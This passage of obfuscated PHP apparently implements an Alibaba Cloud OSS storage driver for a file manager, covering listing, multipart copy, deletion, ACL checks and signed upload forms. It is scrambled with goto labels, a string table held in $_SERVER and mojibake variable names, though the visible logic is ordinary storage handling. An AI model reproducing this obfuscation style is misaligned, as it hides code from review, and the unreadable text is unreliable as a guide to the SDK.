aÅ«§è¼¤¿: if ($aœÉÄ¢ºÔ[$bÕ˜„İÊ“ƒ[172]] != $bÕ˜„İÊ“ƒ[173] || $aœÉÄ¢ºÔ[$bÕ˜„İÊ“ƒ[174]] != $bÕ˜„İÊ“ƒ[173]) { return !1; } $b“Ä¶ä†‘ñ = array_map($bÕ˜„İÊ“ƒ[175], $aœÉÄ¢ºÔ[$bÕ˜„İÊ“ƒ[176]]); if (!is_array($b“Ä¶ä†‘ñ)) { $b“Ä¶ä†‘ñ = array(); } goto bä«£Í×; bä«£Í×: $a‹¶—õˆÊ = array($bÕ˜„İÊ“ƒ[177], $bÕ˜„İÊ“ƒ[178], $bÕ˜„İÊ“ƒ[179], $bÕ˜„İÊ“ƒ[180], $bÕ˜„İÊ“ƒ[181]); $a´Ã¸ëéò» = array_diff($a‹¶—õˆÊ, $b“Ä¶ä†‘ñ); return empty($a´Ã¸ëéò»); goto Eƒ¨ÄŸ•Š; Eƒ¨ÄŸ•Š: } public function mkfile($eŸœÔ¸ÏÅ, $d…°¼Ö‡Ò = '', $c×¿ğÌÔÊÔ = REPEAT_RENAME) { $B÷Âñˆİ® = $this->setContent($eŸœÔ¸ÏÅ, $d…°¼Ö‡Ò); if ($B÷Âñˆİ® !== !1) { return $this->getPathOuter($eŸœÔ¸ÏÅ); } return !1; } public function mkdir($aÌ¯†íï„, $dèö³¹İ¦ = REPEAT_SKIP) { if ($this->_isFolder($aÌ¯†íï„)) { return $this->getPathOuter($aÌ¯†íï„); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($aÌ¯†íï„)); } catch (OSS\Core\OssException $e¶Ô›­‰Ğ¯) { return !1; } return $this->getPathOuter($aÌ¯†íï„); } private function fileList($AŒ…£Ù³°Å, $eŞ‘Çª¸ôÅ = '', $bµ«è•ø´ = 0) { goto AºãÚ·ØŸ; AºãÚ·ØŸ: $B¶¬£ïÑÅ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $AŒ…£Ù³°Å = trim($AŒ…£Ù³°Å, $B¶¬£ïÑÅ[8]); $FïÃå¼¶¹Â = empty($AŒ…£Ù³°Å) ? $B¶¬£ïÑÅ[33] : $AŒ…£Ù³°Å . $B¶¬£ïÑÅ[8]; goto cÒè¦Š‘Íğ; cÒè¦Š‘Íğ: $F§ˆ™ãà©Œ = $B¶¬£ïÑÅ[33]; $DÏ×æùŞá = 1000; $B²­ôõ£‹Ç = $a²Ñ…ñ‡ = array(); goto AÁ¡ˆ‰‹Ë; AÁ¡ˆ‰‹Ë: while (!0) { $BŸƒÄáÚë = array($B¶¬£ïÑÅ[1168] => $eŞ‘Çª¸ôÅ, $B¶¬£ïÑÅ[183] => $FïÃå¼¶¹Â, $B¶¬£ïÑÅ[1169] => $DÏ×æùŞá, $B¶¬£ïÑÅ[1170] => $F§ˆ™ãà©Œ); try { $e†ÍâŞáÁõ = $this->client->listObjects($this->bucket, $BŸƒÄáÚë); } catch (OSS\Core\OssException $FÒ¯Â‹…ˆ) { break; } $F§ˆ™ãà©Œ = $e†ÍâŞáÁõ->getNextMarker(); $Få¨¦Æ‘¾ = $e†ÍâŞáÁõ->getObjectList(); $E²‚ŒÌ¦× = $e†ÍâŞáÁõ->getPrefixList(); foreach ($Få¨¦Æ‘¾ as $A¢ëµÍŞÛÙ) { if ($A¢ëµÍŞÛÙ->getKey() == $FïÃå¼¶¹Â) { continue; } $cŒˆ£¡×ßº = $A¢ëµÍŞÛÙ->getKey(); if ($bµ«è•ø´) { $cŒˆ£¡×ßº = array($B¶¬£ïÑÅ[28] => $cŒˆ£¡×ßº, $B¶¬£ïÑÅ[77] => $A¢ëµÍŞÛÙ->getSize(), $B¶¬£ïÑÅ[187] => strtotime($A¢ëµÍŞÛÙ->getLastModified())); } $a²Ñ…ñ‡[] = $cŒˆ£¡×ßº; } foreach ($E²‚ŒÌ¦× as $CŸö„ê­™) { $B²­ôõ£‹Ç[] = $CŸö„ê­™->getPrefix(); } if ($F§ˆ™ãà©Œ === $B¶¬£ïÑÅ[33]) { break; } } return array($B¶¬£ïÑÅ[74] => $B²­ôõ£‹Ç, $B¶¬£ïÑÅ[73] => $a²Ñ…ñ‡); goto Dì§ƒ¶ñÃ; Dì§ƒ¶ñÃ: } public function copyFile($fíÖ‡ä¨Ş¥, $eÛ‡êÏ«•Œ) { $F»¢ğ‘Ó÷ = $this->size($fíÖ‡ä¨Ş¥); if ($F»¢ğ‘Ó÷ < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $fíÖ‡ä¨Ş¥, $this->bucket, $this->pathEncode($eÛ‡êÏ«•Œ)); } catch (OSS\Core\OssException $DÛÕÙ¼¯©) { return !1; } return !0; } return $this->multiCopyObject($fíÖ‡ä¨Ş¥, $eÛ‡êÏ«•Œ, $F»¢ğ‘Ó÷); } private function multiCopyObject($D‚¥·È¬é, $cÊ­•†§ñ‰, $aí‰ÌìëÆ³) { $BÄòÕì½ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; try { goto f“ç‡Ï¡÷Ÿ; F‘Œ«øö¸ò: $BÚÚ°ÀÜ¶ß = $this->osChunkSize(); $EÛ½ŞŞÈ = $this->client->generateMultiuploadParts($aí‰ÌìëÆ³, $BÚÚ°ÀÜ¶ß); foreach ($EÛ½ŞŞÈ as $c·Â›Œ‡§ù => $AŒÇÈ‘ªÛ) { $Cš­ö¨ƒ± = $BŞÍô¯ºñğ + (int) $AŒÇÈ‘ªÛ[$BÄòÕì½[1172]]; $C¶—¶¿ò  = (int) $AŒÇÈ‘ªÛ[$BÄòÕì½[322]] + $Cš­ö¨ƒ± - 1; $AÇê‚™êïË = array($BÄòÕì½[1173] => $Cš­ö¨ƒ±, $BÄòÕì½[1174] => $C¶—¶¿ò ); $F µ‘ŸÈ”[] = $this->client->uploadPartCopy($this->bucket, $D‚¥·È¬é, $this->bucket, $this->pathEncode($cÊ­•†§ñ‰), $Aß’Á‹öª, $C» åë¾İ, $AÇê‚™êïË); $Aß’Á‹öª = $Aß’Á‹öª + 1; } goto eëÂ…ˆ¼Êğ; eëÂ…ˆ¼Êğ: $e÷”ÑÚºµ = array(); foreach ($F µ‘ŸÈ” as $c·Â›Œ‡§ù => $e·ƒ‚¨™) { $e÷”ÑÚºµ[] = array($BÄòÕì½[1175] => $c·Â›Œ‡§ù + 1, $BÄòÕì½[1176] => $e·ƒ‚¨™); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($cÊ­•†§ñ‰), $C» åë¾İ, $e÷”ÑÚºµ); goto aœÊŸ³‚ùƒ; f“ç‡Ï¡÷Ÿ: $Bôª·ÜÙÑ´ = array(); if ($A‘±™Ò’Ç = $this->hashMd5($D‚¥·È¬é)) { $Bôª·ÜÙÑ´ = array(OSS\OssClient::OSS_HEADERS => array($BÄòÕì½[1171] => $A‘±™Ò’Ç)); } $C» åë¾İ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($cÊ­•†§ñ‰), $Bôª·ÜÙÑ´); goto E‡óŸ‰†ã‚; E‡óŸ‰†ã‚: $Aß’Á‹öª = 1; $BŞÍô¯ºñğ = 0; $F µ‘ŸÈ” = array(); goto F‘Œ«øö¸ò; aœÊŸ³‚ùƒ: } catch (OSS\Core\OssException $F­ÖÅ±ˆ†Î) { return !1; } return !0; } public function moveFile($AìĞ½Ñ±ˆË, $D‹„Œ°ÇŠ) { if ($this->copyFile($AìĞ½Ñ±ˆË, $D‹„Œ°ÇŠ)) { $this->remove($AìĞ½Ñ±ˆË); return !0; } return !1; } public function delFile($bå¡îìôïë) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($bå¡îìôïë)); } catch (OSS\Core\OssException $EÉÍ¥ñœâ°) { return !1; } return !0; } public function delFolder($f¿Ñ†ô‡ãÄ) { $e«ÂÀÍØ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $cá‹††ƒ = $this->fileList($f¿Ñ†ô‡ãÄ); if (!empty($f¿Ñ†ô‡ãÄ) && !in_array(trim($f¿Ñ†ô‡ãÄ, $e«ÂÀÍØ[8]) . $e«ÂÀÍØ[8], $cá‹††ƒ[$e«ÂÀÍØ[73]])) { $cá‹††ƒ[$e«ÂÀÍØ[73]][] = trim($f¿Ñ†ô‡ãÄ, $e«ÂÀÍØ[8]) . $e«ÂÀÍØ[8]; } foreach (array_chunk($cá‹††ƒ[$e«ÂÀÍØ[73]], 1000) as $e½›–ÒùÌ‘) { try { $this->client->deleteObjects($this->bucket, $e½›–ÒùÌ‘); } catch (OSS\Core\OssException $A£öÎ‰‡) { continue; } } return !0; } public function rename($C„†Ôá¸, $E¬æš ‰å‡) { return $this->renameObject($C„†Ôá¸, $E¬æš ‰å‡); } private function fileInfo($AˆöƒÇ‰, $dæ´È”Ë¬ = array()) { goto dÀÏçÛÄ‡À; D½ïÒœÕè: if (isset($dæ´È”Ë¬[$eÅäÛ¾¾Š½[77]])) { $EÍÑŠùİ”³[$eÅäÛ¾¾Š½[77]] = $dæ´È”Ë¬[$eÅäÛ¾¾Š½[77]]; } if (isset($dæ´È”Ë¬[$eÅäÛ¾¾Š½[107]])) { $EÍÑŠùİ”³[$eÅäÛ¾¾Š½[107]] = $dæ´È”Ë¬[$eÅäÛ¾¾Š½[107]]; } if (isset($dæ´È”Ë¬[$eÅäÛ¾¾Š½[187]]) && !trim($EÍÑŠùİ”³[$eÅäÛ¾¾Š½[107]])) { $EÍÑŠùİ”³[$eÅäÛ¾¾Š½[107]] = $dæ´È”Ë¬[$eÅäÛ¾¾Š½[187]]; } goto Bê¦¥Şº•„; dÀÏçÛÄ‡À: $eÅäÛ¾¾Š½ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $EÍÑŠùİ”³ = array($eÅäÛ¾¾Š½[28] => $this->pathThis($AˆöƒÇ‰), $eÅäÛ¾¾Š½[75] => $this->getPathOuter($AˆöƒÇ‰), $eÅäÛ¾¾Š½[29] => $eÅäÛ¾¾Š½[164], $eÅäÛ¾¾Š½[184] => 0, $eÅäÛ¾¾Š½[107] => 0, $eÅäÛ¾¾Š½[77] => 0, $eÅäÛ¾¾Š½[157] => $this->ext($AˆöƒÇ‰), $eÅäÛ¾¾Š½[185] => !0, $eÅäÛ¾¾Š½[186] => !0); if (empty($dæ´È”Ë¬)) { $E Ÿ‘µƒ™© = $this->objectMeta($AˆöƒÇ‰); if (!$E Ÿ‘µƒ™©) { return $EÍÑŠùİ”³; } $dæ´È”Ë¬ = array($eÅäÛ¾¾Š½[107] => strtotime($E Ÿ‘µƒ™©[$eÅäÛ¾¾Š½[1177]]), $eÅäÛ¾¾Š½[77] => $E Ÿ‘µƒ™©[$eÅäÛ¾¾Š½[1178]] + 0); } goto D½ïÒœÕè; Bê¦¥Şº•„: return $EÍÑŠùİ”³; goto a±‚ËŞã¥…; a±‚ËŞã¥…: } private function folderInfo($c¸®Ò›¶°Ç, $F†áµö˜Œô = array()) { $F–‹›õ—Ü° =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $fáôÂ’ñ¢— = array($F–‹›õ—Ü°[28] => $this->pathThis($c¸®Ò›¶°Ç), $F–‹›õ—Ü°[75] => $this->getPathOuter($F–‹›õ—Ü°[8] . $c¸®Ò›¶°Ç), $F–‹›õ—Ü°[29] => $F–‹›õ—Ü°[76], $F–‹›õ—Ü°[184] => 0, $F–‹›õ—Ü°[107] => 0, $F–‹›õ—Ü°[185] => !0, $F–‹›õ—Ü°[186] => !0); if (empty($F†áµö˜Œô)) { $c¸®Ò›¶°Ç = rtrim($c¸®Ò›¶°Ç, $F–‹›õ—Ü°[8]) . $F–‹›õ—Ü°[8]; $eìšÍù„© = $this->objectMeta($c¸®Ò›¶°Ç); if (!$eìšÍù„©) { return $fáôÂ’ñ¢—; } $F†áµö˜Œô = array($F–‹›õ—Ü°[184] => $eìšÍù„©[$F–‹›õ—Ü°[1179]][$F–‹›õ—Ü°[1180]], $F–‹›õ—Ü°[107] => strtotime($eìšÍù„©[$F–‹›õ—Ü°[1177]])); } if (isset($F†áµö˜Œô[$F–‹›õ—Ü°[107]])) { $fáôÂ’ñ¢—[$F–‹›õ—Ü°[107]] = $F†áµö˜Œô[$F–‹›õ—Ü°[107]]; } if (isset($F†áµö˜Œô[$F–‹›õ—Ü°[184]])) { $fáôÂ’ñ¢—[$F–‹›õ—Ü°[184]] = $F†áµö˜Œô[$F–‹›õ—Ü°[184]]; } return $fáôÂ’ñ¢—; } public function listPath($aÕÉÃÔ¡†, $dğìœÀôİ = false) { $f¨§·Ó¶‚‹ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $a‡†”¤ğ‚ç = $this->fileList($aÕÉÃÔ¡†, $f¨§·Ó¶‚‹[8], !0); foreach ($a‡†”¤ğ‚ç[$f¨§·Ó¶‚‹[74]] as $b³Ï£´×Å => $B°ò®‡¥ï) { $a‡†”¤ğ‚ç[$f¨§·Ó¶‚‹[74]][$b³Ï£´×Å] = $this->folderInfo($B°ò®‡¥ï, $B°ò®‡¥ï); } foreach ($a‡†”¤ğ‚ç[$f¨§·Ó¶‚‹[73]] as $b³Ï£´×Å => $B°ò®‡¥ï) { $a‡†”¤ğ‚ç[$f¨§·Ó¶‚‹[73]][$b³Ï£´×Å] = $this->fileInfo($B°ò®‡¥ï[$f¨§·Ó¶‚‹[28]], $B°ò®‡¥ï); } return $a‡†”¤ğ‚ç; } public function has($A µÄĞ£Ï, $F¶„ã½„š¿ = false, $d¤„­ƒÀÖğ = true) { goto E½É‘”Ä±á; DÏâ»§Öáİ: $CÅ™†Ù†ß‘ = $A„Ï–¼—Ô­[33]; $aÉ–½§ğ¯œ = 500; $cø­Ğ…ì¼ = 0; goto dŒ‡Â—ŒÜ ; D‘¨òÏ‰Ä: return !1; goto FïÉŞˆÍÇá; E½É‘”Ä±á: $A„Ï–¼—Ô­ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $A µÄĞ£Ï = trim($A µÄĞ£Ï, $A„Ï–¼—Ô­[8]); $Aî›†„æÎ¶ = empty($A µÄĞ£Ï) ? $A„Ï–¼—Ô­[33] : $A µÄĞ£Ï . $A„Ï–¼—Ô­[8]; goto DÏâ»§Öáİ; dŒ‡Â—ŒÜ : $A‰ƒã‹Ø = 0; while (!0) { $aŞ…À‘Œ æ = array($A„Ï–¼—Ô­[1168] => $A„Ï–¼—Ô­[8], $A„Ï–¼—Ô­[183] => $Aî›†„æÎ¶, $A„Ï–¼—Ô­[1169] => $aÉ–½§ğ¯œ, $A„Ï–¼—Ô­[1170] => $CÅ™†Ù†ß‘); try { $a¨¤à™¤ç‡ = $this->client->listObjects($this->bucket, $aŞ…À‘Œ æ); } catch (OSS\Core\OssException $a‡»°§®†) { break; } $CÅ™†Ù†ß‘ = $a¨¤à™¤ç‡->getNextMarker(); $bšª°Àó‰„ = $a¨¤à™¤ç‡->getObjectList(); $eˆ…ÈÁÓïØ = $a¨¤à™¤ç‡->getPrefixList(); if ($F¶„ã½„š¿) { if (count($bšª°Àó‰„) > 1 || count($bšª°Àó‰„) == 1 && $bšª°Àó‰„[0]->getKey() != $Aî›†„æÎ¶) { $cø­Ğ…ì¼ += count($bšª°Àó‰„) - 1; } if (!empty($eˆ…ÈÁÓïØ)) { $A‰ƒã‹Ø += count($eˆ…ÈÁÓïØ); } if ($CÅ™†Ù†ß‘ === $A„Ï–¼—Ô­[33]) { break; } continue; } if ($d¤„­ƒÀÖğ) { if (!empty($bšª°Àó‰„)) { if (count($bšª°Àó‰„) > 1 || $bšª°Àó‰„[0]->getKey() != $Aî›†„æÎ¶) { return !0; } } } else { if (!empty($eˆ…ÈÁÓïØ)) { return !0; } } if ($CÅ™†Ù†ß‘ === $A„Ï–¼—Ô­[33]) { break; } } if ($F¶„ã½„š¿) { return array($A„Ï–¼—Ô­[188] => $cø­Ğ…ì¼, $A„Ï–¼—Ô­[189] => $A‰ƒã‹Ø); } goto D‘¨òÏ‰Ä; FïÉŞˆÍÇá: } public function listAll($e™˜”·¯Šä) { $E¥¹Šã’ö¾ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $C‡‰†‹ø§Ø = $this->fileList($e™˜”·¯Šä, $E¥¹Šã’ö¾[33], !0); $CÖ‚Ë‡µ×‘ = array(); foreach ($C‡‰†‹ø§Ø[$E¥¹Šã’ö¾[73]] as $FÕçÑ•‰Ùä) { $CÖ‚Ë‡µ×‘[$FÕçÑ•‰Ùä[$E¥¹Šã’ö¾[28]]] = $FÕçÑ•‰Ùä[$E¥¹Šã’ö¾[77]]; } return $this->listAllFiles($e™˜”·¯Šä, array_keys($CÖ‚Ë‡µ×‘), $CÖ‚Ë‡µ×‘); } public function canRead($Føø‡¾Œî«) { $BŞÂÜ²çåÛ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $b‹â»ÃƒÌ¿ = $this->pathAcl($Føø‡¾Œî«); return $b‹â»ÃƒÌ¿ == $BŞÂÜ²çåÛ[1181] || $b‹â»ÃƒÌ¿ == $BŞÂÜ²çåÛ[487] ? !0 : !1; } public function canWrite($d°­˜´Ø£) { $e¡¬ôÒ Ë¿ = $this->pathAcl($d°­˜´Ø£); return $e¡¬ôÒ Ë¿ == $_SERVER[ÚŠ•´ÍéÒÑÔ][487] ? !0 : !1; } public function pathAcl($eëÂ­½¦ùŒ) { goto c×ìƒ¸¬–”; c×ìƒ¸¬–”: $bÚåòĞÁŒÄ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $dÛøÔ¼ó¸¬ = $this->client->getObjectAcl($this->bucket, $this->pathEncode($eëÂ­½¦ùŒ)); } catch (OSS\Core\OssException $bÉ‰º”á) { return !1; } goto F¦²‰ºŒô; d˜ç®æªÄ: return $C’Ø…™‘ùˆ; goto dŒßï£¶Ï¬; F¦²‰ºŒô: $C’Ø…™‘ùˆ = $dÛøÔ¼ó¸¬ == $bÚåòĞÁŒÄ[34] ? $this->bucketAcl : $dÛøÔ¼ó¸¬; if ($C’Ø…™‘ùˆ == $bÚåòĞÁŒÄ[1182]) { return $bÚåòĞÁŒÄ[1181]; } if ($C’Ø…™‘ùˆ == $bÚåòĞÁŒÄ[1183]) { return $bÚåòĞÁŒÄ[487]; } goto d˜ç®æªÄ; dŒßï£¶Ï¬: } private function chmodPath($C®ÒÅÓÕ–ò, $B“ïê‡ª¾„ = '') { $dŠ²ğŞğ– =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $B×Š‘ª»©× = empty($B“ïê‡ª¾„) ? $dŠ²ğŞğ–[1183] : $B“ïê‡ª¾„; $CêŒŞ†²ŒÃ = array($dŠ²ğŞğ–[34], $dŠ²ğŞğ–[182], $dŠ²ğŞğ–[1182], $dŠ²ğŞğ–[1183]); if (!in_array($B×Š‘ª»©×, $CêŒŞ†²ŒÃ)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($C®ÒÅÓÕ–ò), $B×Š‘ª»©×); } catch (OSS\Core\OssException $a†ˆ©‡‚’×) { return !1; } return !0; } public function getContent($E»—½±ªÛ) { return $this->fileSubstr($E»—½±ªÛ, -1); } public function setContent($C¤ŸÄÖ’â, $fÇ–ñÄç¹’ = '') { $f È›­± =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; try { $DÂ’ç¾à÷ç = $this->trafficLimit($f È›­±[1184]); $b‹õÄößÕ = $this->client->putObject($this->bucket, $this->pathEncode($C¤ŸÄÖ’â), $fÇ–ñÄç¹’, $DÂ’ç¾à÷ç); } catch (OSS\Core\OssException $E‡ÜĞ¡Ëá¤) { return !1; } $D£†…Éƒì = array($f È›­±[1171] => trim($b‹õÄößÕ[$f È›­±[1185]], $f È›­±[113]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($C¤ŸÄÖ’â))); $this->updateObjMeta($C¤ŸÄÖ’â, $D£†…Éƒì); return isset($b‹õÄößÕ[$f È›­±[1186]][$f È›­±[1130]]) ? (int) $b‹õÄößÕ[$f È›­±[1186]][$f È›­±[1130]] : strlen($b‹õÄößÕ); } private function updateObjMeta($b†‹ºÄŠ¬, $Dé˜ˆÄ‘ÁÄ) { $b†‹ºÄŠ¬ = $this->pathEncode($b†‹ºÄŠ¬); try { $aù‰¼™öä© = array(OSS\OssClient::OSS_HEADERS => $Dé˜ˆÄ‘ÁÄ); $this->client->copyObject($this->bucket, $b†‹ºÄŠ¬, $this->bucket, $b†‹ºÄŠ¬, $aù‰¼™öä©); } catch (OSS\Core\OssException $AÖñÅìÕ¥Å) { return !1; } return !0; } public function upload($bÔƒ‚œ˜, $EÃÇğ¾ÉÏÀ, $fˆñ§¶Ä¡ = false, $AÙ¨‚£ªÉ = REPEAT_REPLACE) { $e‘ÈÅ¹¥¬ô =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $b¬¹ø¶ÊÌ = trim($bÔƒ‚œ˜, $e‘ÈÅ¹¥¬ô[8]); $cáåœˆ›ÉÎ = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => $this->osChunkSize(), OSS\OssClient::OSS_HEADERS => array($e‘ÈÅ¹¥¬ô[1171] => @md5_file($EÃÇğ¾ÉÏÀ)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($bÔƒ‚œ˜))); $cáåœˆ›ÉÎ = $this->trafficLimit($e‘ÈÅ¹¥¬ô[1184], $cáåœˆ›ÉÎ); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($b¬¹ø¶ÊÌ), $EÃÇğ¾ÉÏÀ, $cáåœˆ›ÉÎ); } catch (OSS\Core\OssException $AÀ±è»Îœ“) { return !1; } return $this->getPathOuter($bÔƒ‚œ˜); } public function getHost() { $B‘Æğ·îÔ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $BíÛ¤à­‡Ï = explode($B‘Æğ·îÔ[168], parent::getHost()); return $BíÛ¤à­‡Ï[0] . $B‘Æğ·îÔ[168] . $this->bucket . $B‘Æğ·îÔ[93] . $BíÛ¤à­‡Ï[1]; } public function uploadFormData($D©™ŒŸÜõ, $Cº„¥ä…÷‡ = 3600) { goto bÖ­Š­ù; F™¶ÀŠ‘õ: $FÆÎİ…”º» = base64_encode(hash_hmac($dãš‘ãß è[215], $cÃìºš˜Ú, $this->secret, !0)); $F¬½ƒ“ˆ¬” = array($dãš‘ãß è[1097] => $cÃìºš˜Ú, $dãš‘ãß è[1190] => $this->accessKey, $dãš‘ãß è[1093] => $dãš‘ãß è[1085], $dãš‘ãß è[1191] => $FÆÎİ…”º», $dãš‘ãß è[166] => $eÁªä™¢®‹); $F¬½ƒ“ˆ¬” = $this->trafficLimit($dãš‘ãß è[1184], $F¬½ƒ“ˆ¬”); goto B·ÔÈïå¼; AÏ›…Ìäì: $Dˆ¾¶„¥»Š = date($dãš‘ãß è[1187], time() + $b¸ÜÛä); $e§‡Øğ†‹ó = new DateTime($Dˆ¾¶„¥»Š); $a»‹Êä²ÕÉ = $e§‡Øğ†‹ó->format(DateTime::ISO8601); goto bÂŒ‘ÖÇö; bÖ­Š­ù: $dãš‘ãß è =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (!($eÁªä™¢®‹ = $this->getHost())) { return !1; } $b¸ÜÛä = $Cº„¥ä…÷‡; goto AÏ›…Ìäì; a”ğŞÈã÷: $bİã®°Ëöã = $this->pathFather($D©™ŒŸÜõ); $E•Ï‡„ÄÈ‰ = array($dãš‘ãß è[1087] => $a»‹Êä²ÕÉ, $dãš‘ãß è[1088] => array(array($dãš‘ãß è[1189], 0, $f²ö‰ˆ¯™Ï), array($dãš‘ãß è[1091], $dãš‘ãß è[1092], $bİã®°Ëöã))); $cÃìºš˜Ú = base64_encode(json_encode($E•Ï‡„ÄÈ‰)); goto F™¶ÀŠ‘õ; bÂŒ‘ÖÇö: $aº‹å‚À„ = strpos($a»‹Êä²ÕÉ, $dãš‘ãß è[281]); $a»‹Êä²ÕÉ = substr($a»‹Êä²ÕÉ, 0, $aº‹å‚À„) . $dãš‘ãß è[1188]; $f²ö‰ˆ¯™Ï = 1048576000 * 5; goto a”ğŞÈã÷; B·ÔÈïå¼: return $F¬½ƒ“ˆ¬”; goto AôŞÀÙÄÚ; AôŞÀÙÄÚ: } public function multiUploadFormData($fÉõ¿§™õ, $F’‡ÒÁÃ—İ = 3600) { $b•…±å¯ñ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (!($f µ‘é¡É = $this->getHost())) { return !1; } $Díä¢¡ŒÑ÷ = $this->trafficLimit($b•…±å¯ñ[1184]); $cÍæÉÕœ˜ˆ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($fÉõ¿§™õ), $Díä¢¡ŒÑ÷); return array($b•…±å¯ñ[206] => $cÍæÉÕœ˜ˆ, $b•…±å¯ñ[166] => $f µ‘é¡É . $b•…±å¯ñ[8] . $this->pathEncode($fÉõ¿§™õ), $b•…±å¯ñ[207] => gmdate($b•…±å¯ñ[1192]), $b•…±å¯ñ[89] => $fÉõ¿§™õ); } public function multiUploadAuthData($c˜È„êÚ†ø, $bĞ¬ŞÎ ½– = array()) { goto eÇ¦øÇÆµ; eÇ¦øÇÆµ: $BŸÛÒé =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $E¡®ñˆÄô‘ = isset($bĞ¬ŞÎ ½–[$BŸÛÒé[207]]) ? $bĞ¬ŞÎ ½–[$BŸÛÒé[207]] : gmdate($BŸÛÒé[1192]); $f¸¹Ø‚Ğ“Ì = isset($bĞ¬ŞÎ ½–[$BŸÛÒé[157]]) ? $bĞ¬ŞÎ ½–[$BŸÛÒé[157]] : $BŸÛÒé[33]; goto D¶²˜‡¢×; E—Ÿ­…¢·è: $EùÆëè‘‘ = $BŸÛÒé[1195] . $this->accessKey . $BŸÛÒé[4] . $fØ‰¯¸£ß; if (strpos($f¸¹Ø‚Ğ“Ì, $BŸÛÒé[210]) === 0) { $EùÆëè‘‘ = array($BŸÛÒé[217] => $EùÆëè‘‘, $BŸÛÒé[207] => $E¡®ñˆÄô‘); if ($E¯Õ Ñä˜) { $EùÆëè‘‘ = array_merge($EùÆëè‘‘, $E¯Õ Ñä˜); } } return $EùÆëè‘‘; goto CÒÎ÷¯¦‘£; D¶²˜‡¢×: $dñ öÜŠø‘ = $c˜È„êÚ†ø; if (isset($bĞ¬ŞÎ ½–[$BŸÛÒé[89]])) { $dñ öÜŠø‘ = $bĞ¬ŞÎ ½–[$BŸÛÒé[89]]; unset($bĞ¬ŞÎ ½–[$BŸÛÒé[89]]); } if (isset($bĞ¬ŞÎ ½–[$BŸÛÒé[208]])) { $bĞ¬ŞÎ ½–[$BŸÛÒé[207]] = $E¡®ñˆÄô‘; return $this->listUploadParts($dñ öÜŠø‘, $bĞ¬ŞÎ ½–); } goto Dœ‚ƒéÈß…; Dœ‚ƒéÈß…: $cùä¤ŠÉ‚Œ = array($BŸÛÒé[209], $BŸÛÒé[33], $BŸÛÒé[116], $E¡®ñˆÄô‘, "\x78\55\157\163\x73\x2d\x64\141\x74\145\x3a{$E¡®ñˆÄô‘}", $BŸÛÒé[8] . $this->bucket . $BŸÛÒé[8] . $dñ öÜŠø‘ . $f¸¹Ø‚Ğ“Ì); if (strpos($f¸¹Ø‚Ğ“Ì, $BŸÛÒé[210]) === 0) { $cùä¤ŠÉ‚Œ[0] = $BŸÛÒé[211]; if ($E¯Õ Ñä˜ = $this->trafficLimit($BŸÛÒé[1184])) { $dñ öÜŠø‘ = $BŸÛÒé[1193]; array_splice($cùä¤ŠÉ‚Œ, 5, 0, $dñ öÜŠø‘ . $BŸÛÒé[4] . $E¯Õ Ñä˜[$dñ öÜŠø‘]); } } if (isset($bĞ¬ŞÎ ½–[$BŸÛÒé[212]]) && $bĞ¬ŞÎ ½–[$BŸÛÒé[212]] == $BŸÛÒé[213]) { $cùä¤ŠÉ‚Œ[0] = $BŸÛÒé[213]; } goto e×¨¦„½“¡; e×¨¦„½“¡: if (!empty($bĞ¬ŞÎ ½–[$BŸÛÒé[1194]])) { $f¤éÉŒ—Ğ = array_merge(array($cùä¤ŠÉ‚Œ[4]), $bĞ¬ŞÎ ½–[$BŸÛÒé[1194]]); sort($f¤éÉŒ—Ğ); $cùä¤ŠÉ‚Œ[4] = implode($BŸÛÒé[214], $f¤éÉŒ—Ğ); } $EßÎ¬¼ğª = implode($BŸÛÒé[214], $cùä¤ŠÉ‚Œ); $fØ‰¯¸£ß = base64_encode(hash_hmac($BŸÛÒé[215], $EßÎ¬¼ğª, $this->secret, !0)); goto E—Ÿ­…¢·è; CÒÎ÷¯¦‘£: } public function listUploadParts($A‚´‘ñ‰Ğ, $F³çš¬Îã) { goto bƒÕ¸àèÁ´; Dèá­íæÉ: $EÀì¯ÓâòÑ = $c»´²”½Ìõ->getListPart(); $B™ãõâÇš = array(); foreach ($EÀì¯ÓâòÑ as $c—éŒ†ªŸ¯) { $B™ãõâÇš[] = array($fÛÜ¶ó‡·Ø[1175] => $c—éŒ†ªŸ¯->getPartNumber(), $fÛÜ¶ó‡·Ø[1176] => trim($c—éŒ†ªŸ¯->getETag(), $fÛÜ¶ó‡·Ø[113])); } goto cÁÛ†‚ÅµÓ; bƒÕ¸àèÁ´: $fÛÜ¶ó‡·Ø =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $fäßäÌ® = parse_url_query($F³çš¬Îã[$fÛÜ¶ó‡·Ø[157]]); $c»´²”½Ìõ = $this->client->listParts($this->bucket, $this->pathEncode($A‚´‘ñ‰Ğ), $fäßäÌ®[$fÛÜ¶ó‡·Ø[206]]); goto Dèá­íæÉ; cÁÛ†‚ÅµÓ: 